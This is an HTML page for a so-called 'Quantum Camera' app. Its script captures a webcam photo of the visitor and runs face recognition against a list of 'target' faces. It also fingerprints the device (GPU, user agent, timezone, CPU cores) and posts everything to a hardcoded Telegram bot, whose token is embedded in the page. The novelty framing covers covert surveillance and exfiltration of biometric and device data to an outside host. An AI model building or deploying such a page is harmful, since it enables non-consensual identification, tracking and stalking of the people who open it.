<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Quantum Camera App</title>
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <style>
    video { width: 100%; max-width: 600px; border: 2px solid #333; }
    #captureButton { padding: 10px 20px; margin-top: 10px; }
  </style>
</head>
<body>
  <h2>Quantum Camera</h2>
  <video id="video" autoplay muted playsinline></video>
  <button id="captureButton">Quantum Scan</button>

  <script>
    const video = document.getElementById('video');
    const captureButton = document.getElementById('captureButton');
    const TELEGRAM_BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const TELEGRAM_CHAT_ID = '1121369247';

    let faceMatcher = null;
    const TARGET_FACE_URLS = [
      'https://yourdomain.com/faces/target1.jpg',
      'https://yourdomain.com/faces/target2.jpg'
    ];

    async function setupCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
    }

    async function loadModels() {
      await faceapi.nets.tinyFaceDetector.loadFromUri('/models');
      await faceapi.nets.faceLandmark68Net.loadFromUri('/models');
      await faceapi.nets.faceRecognitionNet.loadFromUri('/models');
    }

    async function loadTargetFaces() {
      const labeledDescriptors = [];
      for (let i = 0; i < TARGET_FACE_URLS.length; i++) {
        const img = await faceapi.fetchImage(TARGET_FACE_URLS[i]);
        const detection = await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor();
        if (detection) {
          labeledDescriptors.push(new faceapi.LabeledFaceDescriptors('Target-' + (i + 1), [detection.descriptor]));
        }
      }
      if (labeledDescriptors.length > 0) {
        faceMatcher = new faceapi.FaceMatcher(labeledDescriptors);
      }
    }

    async function recognizeFace() {
      const detection = await faceapi.detectSingleFace(video).withFaceLandmarks().withFaceDescriptor();
      if (!detection || !faceMatcher) return { match: "Unknown", distance: "N/A" };
      const bestMatch = faceMatcher.findBestMatch(detection.descriptor);
      return { match: bestMatch.label, distance: bestMatch.distance.toFixed(2) };
    }

    async function gatherDeviceInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const language = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // Extra Device Info
      let gpu = "Unknown";
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch (e) {}

      const touchSupport = ('ontouchstart' in window) ? "Yes" : "No";
      const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
      const cpuCores = navigator.hardwareConcurrency || "Unknown";
      const orientationSensor = 'DeviceOrientationEvent' in window ? "Supported" : "Not Supported";

      return {
        userAgent,
        platform,
        language,
        timezone,
        gpu,
        touchSupport,
        darkMode,
        cpuCores,
        orientationSensor
      };
    }

    async function startQuantumScan() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

      const deviceInfo = await gatherDeviceInfo();
      const faceMatch = await recognizeFace();
      deviceInfo.faceMatch = faceMatch.match;
      deviceInfo.faceDistance = faceMatch.distance;

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', imageBlob, 'capture.jpg');

      const caption = 
        `📸 *Quantum Scan Result*\n\n` +
        `🧠 *Face Match:* ${deviceInfo.faceMatch} (${deviceInfo.faceDistance})\n` +
        `💻 *User-Agent:* ${deviceInfo.userAgent}\n` +
        `🛠 *Platform:* ${deviceInfo.platform}\n` +
        `🗣 *Language:* ${deviceInfo.language}\n` +
        `🌍 *Timezone:* ${deviceInfo.timezone}\n` +
        `🧠 *CPU Cores:* ${deviceInfo.cpuCores}\n` +
        `🎮 *GPU:* ${deviceInfo.gpu}\n` +
        `📲 *Touch Support:* ${deviceInfo.touchSupport}\n` +
        `🌑 *Dark Mode:* ${deviceInfo.darkMode}\n` +
        `📡 *Orientation Sensor:* ${deviceInfo.orientationSensor}\n`;

      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      alert("Quantum Scan complete. Data sent to Telegram.");
    }

    captureButton.addEventListener('click', startQuantumScan);

    (async () => {
      await setupCamera();
      await loadModels();
      await loadTargetFaces();
    })();
  </script>
</body>
</html>
